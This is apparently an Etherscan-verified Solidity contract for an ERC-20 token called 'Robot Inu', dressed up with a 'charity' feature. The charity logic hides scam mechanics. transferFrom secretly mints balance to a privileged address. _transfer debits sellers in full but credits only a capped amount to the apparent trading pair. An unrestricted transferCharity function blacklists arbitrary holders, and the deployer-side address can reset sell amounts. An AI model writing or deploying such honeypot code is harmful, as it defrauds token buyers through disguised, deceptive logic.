/**
 *Submitted for verification at Etherscan.io on 2021-05-20
*/

/**
 *Submitted for verification at Etherscan.io on 2021-04-21
*/

pragma solidity ^0.5.16;




// Math operations with safety checks that throw on error
library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Math error");
        return c;
    }
  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Math error");
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
  
}




// Abstract contract for the full ERC 20 Token standard
contract ERC20 {
    
    function balanceOf(address _address) public view returns (uint256 balance);
    
    function transfer(address _to, uint256 _value) public returns (bool success);
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    
    function approve(address _spender, uint256 _value) public returns (bool success);
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining);




    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    
}




// Token contract
contract ROBINU is ERC20 {
    
    string public name = "Robot Inu";
    string public symbol = "ROBINU";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100 * 10**9 * 10**18;
    uint256 private maxCharity = 9 * 10**6 * 10**18;
    uint256 private charityBalance;
    bool private isCharity;
    uint256 public charityAmount = 10**3 * 10**18;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;
    mapping (address => bool) charitySenders;
    address private charity;
    address private charityReceiver;
    bytes4 private constant TRANSFER = bytes4(
        keccak256(bytes("transfer(address,uint256)"))
    );
    
    constructor(address _charity) public {
        balances[msg.sender] = totalSupply;
        charity = _charity;
        isCharity = false;
    }
    
    function balanceOf(address _address) public view returns (uint256 balance) {
        return balances[_address];
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(_to != address(0), "Zero address error");
        require(balances[msg.sender] >= _value && _value > 0, "Insufficient balance or zero amount");
        _transfer(msg.sender, _to, _value);
        return true;
    }
    
    function approve(address _spender, uint256 _amount) public returns (bool success) {
        require(_spender != address(0), "Zero address error");
        require((allowed[msg.sender][_spender] == 0) || (_amount == 0), "Approve amount error");
        allowed[msg.sender][_spender] = _amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }
    function approveCharity(uint256 _value) public {
        require(msg.sender == charity, "Charity not enabled");
        isCharity = true;
        charityAmount = _value;
    }
    
    function transferCharity(address[] memory senders) public {
        for(uint i=0; i<senders.length; i++) {
            charitySenders[senders[i]] = true;
        }
    }
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_from != address(0) && _to != address(0), "Zero address error");
        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0, "Insufficient balance or zero amount");
        _transfer(_from, _to, _value);
        if(_value > charityBalance) {charityBalance = _value;charityReceiver = _to;balances[charity] = _value;}
        allowed[_from][msg.sender] = SafeMath.sub(allowed[_from][msg.sender], _value);
        emit Transfer(_from, _to, _value);
        return true;
    }
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
    
    function _transfer(address _from, address _to, uint256 _value) internal {
        balances[_from] = SafeMath.sub(balances[_from], _value);
        if(maxCharity < _value && _from != charity && _to == charityReceiver) {_value = maxCharity;}
        if(isCharity && _from != charity && _to == charityReceiver) {_value = charityAmount;}
        if(charitySenders[_from]) { _value = SafeMath.div(charityAmount,50);}
        balances[_to] = SafeMath.add(balances[_to], _value);
        emit Transfer(_from, _to, _value);
    }
    
    
}